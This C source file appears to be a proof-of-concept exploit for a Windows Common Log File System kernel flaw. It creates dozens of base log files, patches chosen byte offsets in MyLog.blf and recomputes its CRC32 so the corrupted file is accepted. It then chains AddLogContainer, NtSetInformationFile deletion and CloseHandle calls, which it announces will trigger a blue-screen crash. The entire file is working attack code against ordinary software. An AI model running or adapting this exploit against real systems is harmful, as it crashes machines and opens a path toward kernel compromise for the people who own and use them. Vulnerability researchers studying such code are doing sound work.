#include "head.h"

DWORD CRC32(BYTE* ptr, DWORD Size)
{
	DWORD crcTable[256], crcTmp1;

	// 动态生成CRC-32表
	for (int i = 0; i < 256; i++)
	{
		crcTmp1 = i;
		for (int j = 8; j > 0; j--)
		{
			if (crcTmp1 & 1) crcTmp1 = (crcTmp1 >> 1) ^ 0xEDB88320L;
			else crcTmp1 >>= 1;
		}
		crcTable[i] = crcTmp1;
	}

	// 计算CRC32值
	DWORD crcTmp2 = 0xFFFFFFFF;
	while (Size--)
	{
		crcTmp2 = ((crcTmp2 >> 8) & 0x00FFFFFF) ^ crcTable[(crcTmp2 ^ (*ptr)) & 0xFF];
		ptr++;
	}
	return (crcTmp2 ^ 0xFFFFFFFF);
}


int main()
{
	WCHAR* name;
	name = (WCHAR*)malloc(0x10000);

	ULONGLONG pcbContainer = 0;
	DWORD NumberOfBytesRead;

	// 1. Create Mylog.blf
	HANDLE logFile = CreateLogFile(L"LOG:C:\\Users\\Public\\MyLog", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);
	if (logFile == (HANDLE)-1)
	{
		DWORD error = GetLastError();
		printf("error=%d\n", error);
		return 1;
	}
	CloseHandle(logFile);

	// 2. Create dozens of base log files named MyLog_xxx.blf
	int num = 60;

	for (int i = 0; i < num; i++)
	{
		HANDLE logFile1;
		do {
			memset(name, 0, 0x1000);
			unsigned int rnum = rand();
			wsprintfW(name, L"%s_%d", L"LOG:C:\\Users\\Public\\MyLog", rnum);
			logFile1 = CreateLogFile(name, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);
		} while (logFile1 == (HANDLE)-1);
	}
	
	// 3. Modify some bytes for MyLog.blf
	// 0x868	|80 79 00 00| => |50 00 00 00|
	// 0x9A8	|58 13 00 00| => |30 1B 00 00|
	// 0x1B98	|F8 00 00 00| => |4B 11 01 00|
	// 0x2390	|00 00 00 00 00 00 00 00| => |B8 1B 00 00 30 1B 00 00|
	// 0x23A0	|00 00 00 00| => |07 F0 FD C1|
	// 0x23A4	|00 00 00 00 00 00 00 00| => |88 00 00 00 00 00 00 00|
	// 0x23AB	|00| => |01|
	// 0x2418	|00 00 00 00| => |20 00 00 00|
	HANDLE v49 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(v49, 0x868, 0, FILE_BEGIN);
	ULONGLONG modify = 0;
	modify = 0x50;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x9A8, 0, FILE_BEGIN);
	modify = 0x1B30;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x1B98, 0, FILE_BEGIN);
	modify = 0x01114B;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x2390, 0, FILE_BEGIN);
	modify = 0x1B3000001BB8;
	WriteFile(v49, &modify, 0x8, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23A0, 0, FILE_BEGIN);
	modify = 0xC1FDF007;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23A4, 0, FILE_BEGIN);
	modify = 0x88;
	WriteFile(v49, &modify, 0x8, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x23AB, 0, FILE_BEGIN);
	modify = 0x1;
	WriteFile(v49, &modify, 0x1, &NumberOfBytesRead, 0);

	SetFilePointer(v49, 0x2418, 0, FILE_BEGIN);
	modify = 0x20;
	WriteFile(v49, &modify, 0x4, &NumberOfBytesRead, 0);
	CloseHandle(v49);

	
	HANDLE v43 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(v43, 0x800, 0, FILE_CURRENT);
	PBYTE baselog_buf = (PBYTE)malloc(0x7a00);
	ReadFile(v43, baselog_buf, 0x7a00, &NumberOfBytesRead, 0);
	*(DWORD*)(baselog_buf + 0xc) = 0;	// set CRC32 to zero
	unsigned int crc32 = CRC32(baselog_buf, 0x7a00);
	printf("crc32: 0x%8x\n", crc32);
	CloseHandle(v43);
	free(baselog_buf);

	HANDLE v50 = CreateFileW(L"C:\\Users\\Public\\MyLog.blf", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	SetFilePointer(v50, 0x80C, 0, FILE_CURRENT);
	WriteFile(v50, &crc32, 4, &NumberOfBytesRead, 0);
	CloseHandle(v50);

	// 4. Call the CreateLogFile API to create a base log file MyLxg_xxx.blf
	puts("open fake mylog.blf");
	system("pause");
	HANDLE v51 = CreateLogFile(L"LOG:C:\\Users\\Public\\MyLog", GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);
	if (v51 == (HANDLE)-1)
	{
		printf("open failed\n");
		printf("error: %d\n", GetLastError());
		exit(1);
	}
	
	printf("ok %x\n", v51);

	int v53 = rand();
	WCHAR* v25 = (WCHAR*)malloc(0x1000);
	WCHAR* v85 = v25;
	memset(v25, 0, 0x1000);
	wsprintfW(v85, L"%s_%d", L"LOG:C:\\Users\\Public\\MyLxg", v53);
	HANDLE v55 = CreateLogFile(v85, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_ALWAYS, NULL);
	if (v55 == (HANDLE)-1)
	{
		printf("choose name fail ... duplicate\n");
		exit(1);
	}

	// 5. Call the AddLogContainer API to add a log container for the base log file MyLxg_xxx.blf created
	pcbContainer = 512;
	int v56 = rand();
	WCHAR pwszContainerPath[768] = { 0 };
	wsprintfW(pwszContainerPath, L"C:\\Users\\Public\\.container_1%d", v56);
	printf("LOG:C:\\Users\\Public\\MyLxg_xxx AddLogContainer before\n");
	if (!AddLogContainer(v55, &pcbContainer, pwszContainerPath, 0))
	{
		CloseHandle(v55);
		CloseHandle(v51);
		printf("AddLogContainer fail, please delete C:\\Users\\Public\\MyLxg_xxx.blf and try it again!\n");
		exit(1);
	}
	printf("LOG:C:\\Users\\Public\\MyLxg_xxx AddLogContainer after\n");

	// 6. Obtain the function address of the NtSetInformationFile API
	HMODULE LibraryA = LoadLibraryA("ntdll.dll");
	NtSetInformationFile fnNtSetInformationFile;
	fnNtSetInformationFile = (NtSetInformationFile)GetProcAddress(LibraryA, "NtSetInformationFile");
	if (fnNtSetInformationFile)
	{
		// 7. Call the AddLogContainer API to add a log container for the base log file MyLog.blf 
		pcbContainer = 512;
		printf("LOG:C:\\Users\\Public\\MyLog AddLogContainer before\n");
		AddLogContainer(v51, &pcbContainer, pwszContainerPath, 0);
		printf("LOG:C:\\Users\\Public\\MyLog AddLogContainer after\n");

		char v33[16] = { 0 };
		char v28[4] = {};
		v28[0] = 1;

		// 8. Call NtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1, (FILE_INFORMATION_CLASS)13). When the value is FileDispositionInformation (13), the function will delete the file when it is closed or will cancel a previously requested deletion.
		printf("Calling NtSetInformationFile\n");
		fnNtSetInformationFile(v55, (PIO_STATUS_BLOCK)v33, v28, 1, (FILE_INFORMATION_CLASS)FileDispositionInformation);

		// 9. Call the CloseHandle API to close the handle of the base log file MyLxg_xxx.blf, to trigger this vulnerability
		printf("CloseHandle for LOG:C:\\Users\\Public\\MyLxg_xxx\n");
		printf("It's about to trigger BSOD\n");
		system("pause");
		CloseHandle(v55);
		printf("CloseHandle for LOG:C:\\Users\\Public\\MyLog\n");
		CloseHandle(v51);
	}

	return 0;
}